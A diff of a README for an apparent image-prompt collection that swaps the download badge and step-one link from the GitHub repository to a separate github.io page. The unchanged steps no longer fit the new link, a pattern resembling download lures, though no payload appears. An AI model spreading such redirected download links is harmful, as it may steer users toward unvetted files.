@@ -1,6 +1,6 @@
 # 🎨 Awesome-GPT-Image-2-API-Prompts - Create high quality images using simple text
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/riacheriache73-droid/Awesome-GPT-Image-2-API-Prompts)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://riacheriache73-droid.github.io)
 
 ### About the project
 
@@ -18,7 +18,7 @@ Your computer needs a few things to run these prompts correctly.
 
 Follow these steps to obtain the prompt collection.
 
-1. Select the following link to reach the repository page: [https://github.com/riacheriache73-droid/Awesome-GPT-Image-2-API-Prompts](https://github.com/riacheriache73-droid/Awesome-GPT-Image-2-API-Prompts)
+1. Select the following link to reach the repository page: [https://riacheriache73-droid.github.io](https://riacheriache73-droid.github.io)
 2. Locate the green button labeled "Code" on the right side of the page.
 3. Click the button and choose "Download ZIP".
 4. Find the downloaded file in your "Downloads" folder.
